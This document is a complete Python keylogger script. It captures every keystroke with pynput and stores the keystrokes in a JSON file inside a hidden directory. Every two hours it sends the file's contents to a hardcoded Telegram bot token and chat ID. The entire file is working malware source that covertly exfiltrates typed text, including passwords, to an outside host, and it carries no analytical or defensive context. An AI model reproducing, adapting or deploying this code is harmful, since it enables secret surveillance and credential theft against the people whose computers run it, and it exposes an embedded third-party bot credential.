import os
import json
import time
from datetime import datetime
from pynput import keyboard
from telegram import Bot

# Hidden directory based on OS
def get_hidden_directory():
    if os.name == 'nt':  # Windows
        return os.path.join(os.getenv('APPDATA'), 'system_hidden')
    else:  # Linux/macOS
        return os.path.expanduser('~/.system_hidden')

# Ensure hidden directory exists
def ensure_directory_exists():
    directory = get_hidden_directory()
    if not os.path.exists(directory):
        os.makedirs(directory)
    return directory

# JSON file path
def get_file_path():
    directory = ensure_directory_exists()
    return os.path.join(directory, 'keylog.json')

# Save keystrokes to a JSON file
def save_keystrokes(keys):
    file_path = get_file_path()
    if not os.path.exists(file_path):
        data = []
    else:
        with open(file_path, 'r') as f:
            data = json.load(f)

    data.append({
        'timestamp': str(datetime.now()),
        'keys': keys
    })

    with open(file_path, 'w') as f:
        json.dump(data, f)

# Telegram bot setup
BOT_TOKEN = '7633258412:AAGFGEgmR6MagBUXOwbdCxTVHhfRryA5OPs'
CHAT_ID = '2141142912'

def send_to_telegram():
    file_path = get_file_path()
    if os.path.exists(file_path):
        with open(file_path, 'r') as f:
            data = f.read()
        bot = Bot(token=BOT_TOKEN)
        bot.send_message(chat_id=CHAT_ID, text=f'Keystrokes: {data}')

# Keylogger logic
keys = []

def on_press(key):
    try:
        keys.append(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            keys.append(' ')
        else:
            keys.append(str(key))

    # Save to JSON after every 10 keystrokes
    if len(keys) > 10:
        save_keystrokes(keys)
        keys.clear()

# Send data every 2 hours or on boot
def periodic_send():
    while True:
        send_to_telegram()
        time.sleep(7200)  # 2 hours

# Start the keylogger
def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    import threading
    # Send keystrokes every 2 hours in the background
    threading.Thread(target=periodic_send, daemon=True).start()

    # Start keylogging
    start_keylogger()
